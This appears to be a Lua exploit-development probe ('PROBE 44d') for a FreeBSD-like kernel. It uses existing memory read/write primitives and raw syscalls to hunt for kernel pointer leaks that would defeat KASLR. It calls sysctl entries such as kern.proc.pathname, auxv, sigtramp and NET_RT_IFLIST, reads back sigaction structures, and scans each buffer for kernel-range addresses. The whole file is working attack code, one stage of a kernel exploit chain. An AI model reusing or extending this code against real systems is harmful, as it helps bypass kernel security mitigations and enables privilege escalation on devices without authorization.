-- CRASH_CLASS: MODERATE (creative KASLR approaches)
-- PROBE 44d: Creative KASLR defeat — alternative approaches
--
-- All direct info leak paths are dead (kldstat, kldsym, AF_ROUTE, kinfo_proc,
-- gsbase, msgbuf). This probe tries unconventional approaches:
--
-- 1. sysctl kern.proc.pathname — might leak kernel vnode pointers
-- 2. sysctl kern.proc.groups — might have kernel addresses in padding
-- 3. sysctl kern.proc.rlimit — resource limits with kernel metadata
-- 4. NET_RT_IFLIST — network interface list (different from AF_ROUTE)
-- 5. Timing oracle — measure syscall timing to narrow KASLR range
-- 6. kern.proc.env — environment variables (may contain kernel paths)
-- 7. sigaction readback — signal handler structs might leak kernel addrs

print("=== PROBE 44d: CREATIVE KASLR DEFEAT ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function qw_hex(v)
    if type(v) == "table" and v.h then
        return string.format("%08X_%08X", v.h, v.l)
    end
    return string.format("%08X", to_num(v))
end

local sc_getpid = make_syscall(20)
local sc_sysctl = make_syscall(202)
local sc_mmap = make_syscall(477)

local pid = 0
pcall(function() pid = to_num(sc_getpid()) end)
print("pid: " .. pid)

local function try_sysctl(name, mib, miblen, bufsize)
    print(string.format("--- %s (MIB={%s}, bufsize=%d) ---", name,
        table.concat(mib, ","), bufsize))
    local mib_buf = memory.alloc(miblen * 4)
    for i, v in ipairs(mib) do safe_wd(mib_buf + (i-1)*4, v) end
    local outbuf = memory.alloc(bufsize)
    for i = 0, math.min(bufsize/4, 255) - 1 do safe_wd(outbuf + i*4, 0xAAAAAAAA) end
    local oldlenp = memory.alloc(8)
    safe_wd(oldlenp, bufsize)

    local ok, ret = pcall(function()
        return sc_sysctl(uint64(mib_buf), uint64(miblen), uint64(outbuf),
            uint64(oldlenp), uint64(0), uint64(0))
    end)
    local rv = ok and to_num(ret) or -999
    local actual_len = safe_rd(oldlenp) or 0
    print(string.format("  ret=%d  actual_len=%d", rv, actual_len))

    if rv == 0 and actual_len > 0 then
        -- Scan for kernel pointers
        local kptrs = 0
        local max_scan = math.min(actual_len, bufsize)
        for off = 0, max_scan - 8, 8 do
            local lo = safe_rd(outbuf + off) or 0
            local hi = safe_rd(outbuf + off + 4) or 0
            if hi >= 0xFFFF8000 and hi < 0xFFFFFFFF then
                print(string.format("  *** KPTR at +%03X: %08X_%08X ***", off, hi, lo))
                kptrs = kptrs + 1
            end
        end

        -- Print first 64 bytes regardless
        local bytes_to_show = math.min(actual_len, 64)
        local hex_line = "  data: "
        for i = 0, bytes_to_show - 1, 4 do
            local v = safe_rd(outbuf + i)
            hex_line = hex_line .. string.format("%08X ", v or 0)
            if (i + 4) % 32 == 0 and i + 4 < bytes_to_show then
                print(hex_line)
                hex_line = "        "
            end
        end
        if #hex_line > 8 then print(hex_line) end

        if kptrs == 0 then print("  no kernel pointers") end
        return actual_len
    elseif rv == -999 then
        print("  CRASHED")
    else
        print("  blocked or empty")
    end
    return 0
end

--------------------------------------------------------------------
-- A) kern.proc.pathname (MIB: CTL_KERN=1, KERN_PROC=14, KERN_PROC_PATHNAME=12, pid)
--------------------------------------------------------------------
print("")
print("=== A: KERN.PROC.PATHNAME ===")
try_sysctl("kern.proc.pathname", {1, 14, 12, pid}, 4, 1024)
try_sysctl("kern.proc.pathname(-1)", {1, 14, 12, -1}, 4, 1024)

--------------------------------------------------------------------
-- B) kern.proc.groups (MIB: CTL_KERN=1, KERN_PROC=14, KERN_PROC_GROUPS=18, pid)
--------------------------------------------------------------------
print("")
print("=== B: KERN.PROC.GROUPS ===")
try_sysctl("kern.proc.groups", {1, 14, 18, pid}, 4, 1024)

--------------------------------------------------------------------
-- C) kern.proc.rlimit (MIB: CTL_KERN=1, KERN_PROC=14, KERN_PROC_RLIMIT=19, pid)
--------------------------------------------------------------------
print("")
print("=== C: KERN.PROC.RLIMIT ===")
try_sysctl("kern.proc.rlimit", {1, 14, 19, pid}, 4, 1024)

--------------------------------------------------------------------
-- D) kern.proc.umask (MIB: CTL_KERN=1, KERN_PROC=14, KERN_PROC_UMASK=39, pid)
--------------------------------------------------------------------
print("")
print("=== D: KERN.PROC.UMASK ===")
try_sysctl("kern.proc.umask", {1, 14, 39, pid}, 4, 64)

--------------------------------------------------------------------
-- E) kern.proc.osrel (MIB: CTL_KERN=1, KERN_PROC=14, KERN_PROC_OSREL=40, pid)
--------------------------------------------------------------------
print("")
print("=== E: KERN.PROC.OSREL ===")
try_sysctl("kern.proc.osrel", {1, 14, 40, pid}, 4, 64)

--------------------------------------------------------------------
-- F) NET_RT_IFLIST (MIB: CTL_NET=4, PF_ROUTE=17, 0, 0, NET_RT_IFLIST=3, 0)
--------------------------------------------------------------------
print("")
print("=== F: NET_RT_IFLIST ===")
try_sysctl("net.route.iflist", {4, 17, 0, 0, 3, 0}, 6, 4096)

--------------------------------------------------------------------
-- G) NET_RT_IFLISTL (extended, MIB: CTL_NET=4, PF_ROUTE=17, 0, 0, NET_RT_IFLISTL=5, 0)
--------------------------------------------------------------------
print("")
print("=== G: NET_RT_IFLISTL ===")
try_sysctl("net.route.iflistl", {4, 17, 0, 0, 5, 0}, 6, 8192)

--------------------------------------------------------------------
-- H) kern.proc.cwd (MIB: CTL_KERN=1, KERN_PROC=14, KERN_PROC_CWD=42, pid)
--------------------------------------------------------------------
print("")
print("=== H: KERN.PROC.CWD ===")
try_sysctl("kern.proc.cwd", {1, 14, 42, pid}, 4, 1024)

--------------------------------------------------------------------
-- I) sigaction readback — check for kernel pointers in signal structs
--------------------------------------------------------------------
print("")
print("=== I: SIGACTION READBACK ===")
local sc_sigaction = make_syscall(416)
for sig = 1, 15 do
    local sa_buf = memory.alloc(64)
    for i = 0, 15 do safe_wd(sa_buf + i*4, 0) end
    local old_buf = memory.alloc(64)
    for i = 0, 15 do safe_wd(old_buf + i*4, 0xBBBBBBBB) end

    local ok, ret = pcall(function()
        return sc_sigaction(uint64(sig), uint64(0), uint64(old_buf))
    end)
    local rv = ok and to_num(ret) or -999
    if rv == 0 then
        local handler_lo = safe_rd(old_buf) or 0
        local handler_hi = safe_rd(old_buf + 4) or 0
        if handler_hi >= 0xFFFF8000 and handler_hi < 0xFFFFFFFF then
            print(string.format("  sig %d: KERNEL HANDLER %08X_%08X", sig, handler_hi, handler_lo))
        elseif handler_lo ~= 0 or handler_hi ~= 0 then
            print(string.format("  sig %d: handler=%08X_%08X", sig, handler_hi, handler_lo))
        end
    end
end
print("  sigaction scan complete")

--------------------------------------------------------------------
-- J) kern.ps_strings — pointer to process strings structure
--------------------------------------------------------------------
print("")
print("=== J: KERN.PS_STRINGS ===")
try_sysctl("kern.ps_strings", {1, 32}, 2, 64)

--------------------------------------------------------------------
-- K) kern.usrstack — user stack address
--------------------------------------------------------------------
print("")
print("=== K: KERN.USRSTACK ===")
try_sysctl("kern.usrstack", {1, 33}, 2, 64)

--------------------------------------------------------------------
-- L) hw.pagesizes
--------------------------------------------------------------------
print("")
print("=== L: HW.PAGESIZES ===")
try_sysctl("hw.pagesizes", {6, 32}, 2, 128)

--------------------------------------------------------------------
-- M) kern.proc.auxv (MIB: CTL_KERN=1, KERN_PROC=14, KERN_PROC_AUXV=36, pid)
--------------------------------------------------------------------
print("")
print("=== M: KERN.PROC.AUXV ===")
try_sysctl("kern.proc.auxv", {1, 14, 36, pid}, 4, 4096)

--------------------------------------------------------------------
-- N) kern.proc.sigtramp (MIB: CTL_KERN=1, KERN_PROC=14, KERN_PROC_SIGTRAMP=41, pid)
--------------------------------------------------------------------
print("")
print("=== N: KERN.PROC.SIGTRAMP ===")
try_sysctl("kern.proc.sigtramp", {1, 14, 41, pid}, 4, 256)

print("")
print("=== PROBE 44d COMPLETE ===")
